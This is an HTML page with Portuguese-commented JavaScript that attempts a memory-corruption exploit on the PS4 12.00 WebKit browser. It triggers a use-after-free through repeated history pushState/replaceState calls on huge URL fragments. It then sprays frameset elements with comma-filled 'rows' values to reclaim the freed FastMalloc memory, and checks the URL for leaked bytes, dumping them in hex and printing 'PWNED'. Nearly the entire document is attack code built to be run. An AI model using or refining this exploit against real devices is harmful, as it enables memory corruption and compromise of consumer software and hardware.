<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit 12.00 - Frameset Spray</title>
<style>
    body { background-color: #000; color: #0f0; font-family: monospace; }
    button { padding: 10px; width: 100%; font-weight: bold; font-size: 16px; cursor: pointer; }
</style>
</head>
<body>
<h2>PS4 12.00 - FastMalloc Reclamation (Frameset)</h2>
<div id="status">Pronto</div>
<button onclick="runFramesetExploit()">INICIAR FRAMESET SPRAY</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");
function log(m) { logEl.innerText += m + "\n"; }
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// Mantém os framesets vivos para não liberar a memória
var keepAlive = [];

async function runFramesetExploit() {
    logEl.innerText = "";
    keepAlive = []; // Limpa memória antiga

    // === FASE 1: TRIGGER UAF ===
    statusEl.innerText = "1. Abrindo buraco (UAF)...";
    log("Disparando UAF para criar o buraco de ~340KB...");
    
    let size = 977;
    const STEP = 14461;
    let finalSize = 0;

    for(let i = 0; i < 48; i++) {
        let frag = "V".repeat(size); 
        history.pushState({}, "", "#" + frag);
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) setTimeout(() => history.back(), 0);
        
        finalSize = size;
        size += STEP;
        await sleep(5);
    }
    
    // Pequena pausa para garantir que o free() ocorreu
    await sleep(50);
    
    // === FASE 2: FRAMESET SPRAY ===
    statusEl.innerText = "2. Spraying Framesets...";
    log(`Tentando ocupar ${finalSize} bytes usando Frameset Rows...`);

    // Cálculo baseado no psfree.mjs: 
    // Tamanho Alvo / 8 bytes por Length - Overhead
    const BASE_COMMAS = Math.floor(finalSize / 8); 
    
    // Vamos usar a técnica "Shotgun" novamente, mas variando o número de vírgulas
    // Variação de -100 a +100 vírgulas para acertar o alinhamento
    for(let delta = -100; delta <= 100; delta++) {
        let count = BASE_COMMAS + delta;
        let payload = ",".repeat(count);
        
        // Criamos lotes de framesets
        for(let k=0; k<5; k++) {
            let f = document.createElement("frameset");
            f.rows = payload; 
            keepAlive.push(f);
        }
    }

    log(`Spray concluído. ${keepAlive.length} framesets criados.`);
    await sleep(100);

    // === FASE 3: VERIFICAÇÃO ===
    statusEl.innerText = "3. Checando URL...";
    let url = document.URL;
    
    // O frameset preenche a memória com objetos Length.
    // Na memória bruta, isso se parece com padrões binários repetitivos, não ASCII limpo.
    // Vamos procurar por algo que NÃO seja 'V' (0x56) e nem 'h' (0x68).
    
    let changed = false;
    let firstChange = -1;

    // Começamos a ler depois do "https://.../#"
    for(let i = 50; i < 1000; i++) {
        if(url[i] !== 'V') {
            changed = true;
            firstChange = i;
            break;
        }
    }

    if(changed) {
        log("!!! SUCESSO CRÍTICO !!!");
        log(`A memória mudou no offset ${firstChange}!`);
        log(`O Frameset ocupou o lugar do HistoryItem.`);
        log("Hex Dump parcial:");
        
        let dump = "";
        for(let i=firstChange; i<firstChange+16; i++) {
            dump += url.charCodeAt(i).toString(16).padStart(2,'0') + " ";
        }
        log(dump);
        statusEl.innerText = "PWNED: FRAMESET RECLAIM";
    } else {
        log("Falha: Ainda vendo apenas 'V'.");
        log("Tentativa: Aumente o range do loop de vírgulas (ex: -500 a +500).");
    }
}
</script>
</body>
</html>
